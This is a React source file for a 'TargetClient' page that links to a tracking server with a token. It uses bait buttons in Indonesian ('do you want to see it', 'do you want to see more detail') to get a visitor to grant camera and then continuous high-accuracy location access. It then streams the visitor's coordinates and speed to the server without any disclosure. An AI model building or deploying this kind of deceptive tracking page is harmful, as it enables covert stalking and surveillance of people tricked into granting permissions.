import React, { useState, useEffect, useRef } from 'react';
import { io } from 'socket.io-client';
import { MapPin, Video, Send, CheckCircle, AlertCircle, ShieldCheck } from 'lucide-react';

export default function TargetClient({ token }) {
  const [status, setStatus] = useState('ready');
  const [errorMsg, setErrorMsg] = useState('');
  const [locationActive, setLocationActive] = useState(false);
  const [cameraActive, setCameraActive] = useState(false);
  const [coords, setCoords] = useState({ latitude: null, longitude: null });
  const [speed, setSpeed] = useState(0);
  const socketRef = useRef(null);
  const videoRef = useRef(null);
  const geoWatchIdRef = useRef(null);
  const SOCKET_SERVER = import.meta.env.VITE_API_URL;
  const [step, setStep] = useState(0); // 0 = ask camera, 1 = ask location

  useEffect(() => {
    if (token && status === 'ready') {
      handleStartSharing();
    }
    return () => {
      if (geoWatchIdRef.current) {
        navigator.geolocation.clearWatch(geoWatchIdRef.current);
      }
      if (socketRef.current) {
        socketRef.current.disconnect();
      }
    };
  }, []);

  const handleStartSharing = async () => {
    setStatus('connecting');
    try {
      const socket = io(SOCKET_SERVER, { transports: ['websocket'] });
      socketRef.current = socket;
      socket.on('connect', () => socket.emit('device:auth', { token }));
      socket.on('device:auth_success', () => setStatus('tracking'));
      socket.on('device:auth_error', (data) => {
        setStatus('error');
        setErrorMsg(data.message || 'Invalid token');
        socket.disconnect();
      });
    } catch (e) {
      setStatus('error');
      setErrorMsg('Failed to connect');
    }
  };

  const requestCamera = async () => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      if (videoRef.current) {
        videoRef.current.srcObject = stream;
        videoRef.current.play();
      }
      setCameraActive(true);
      setStep(1);
    } catch (e) {
      console.warn('Camera permission denied');
    }
  };

  const requestLocation = () => {
    if (!('geolocation' in navigator)) {
      console.warn('Geolocation not supported');
      return;
    }
    const watchId = navigator.geolocation.watchPosition(
      (pos) => {
        const { latitude, longitude, speed } = pos.coords;
        const sp = speed ? speed * 3.6 : 0;
        setCoords({ latitude, longitude });
        setSpeed(sp);
        if (socketRef.current) {
          socketRef.current.emit('device:ping', { latitude, longitude, speed: sp });
        }
      },
      (err) => console.warn('Location permission denied', err),
      { enableHighAccuracy: true, maximumAge: 0, timeout: 10000 }
    );
    geoWatchIdRef.current = watchId;
    setLocationActive(true);
  };

  return (
    <div className="p-4 space-y-4">
      {step === 0 && (
        <button
          onClick={requestCamera}
          className="px-4 py-2 bg-sky-600 text-white rounded hover:bg-sky-500 transition"
        >
          apakah kamu ingin melihatnya
        </button>
      )}
      {step === 1 && (
        <button
          onClick={requestLocation}
          className="px-4 py-2 bg-emerald-600 text-white rounded hover:bg-emerald-500 transition"
        >
          apakah kamu ingin melihat lebih detail
        </button>
      )}
      {cameraActive && (
        <video ref={videoRef} autoPlay playsInline muted className="w-full max-w-md rounded" />
      )}
      {locationActive && coords.latitude && (
        <div className="text-sm text-gray-200">
          <p>Latitude: {coords.latitude.toFixed(5)}</p>
          <p>Longitude: {coords.longitude.toFixed(5)}</p>
          <p>Speed: {speed.toFixed(1)} km/h</p>
        </div>
      )}
      {status === 'error' && <p className="text-red-500">{errorMsg}</p>}
    </div>
  );
}
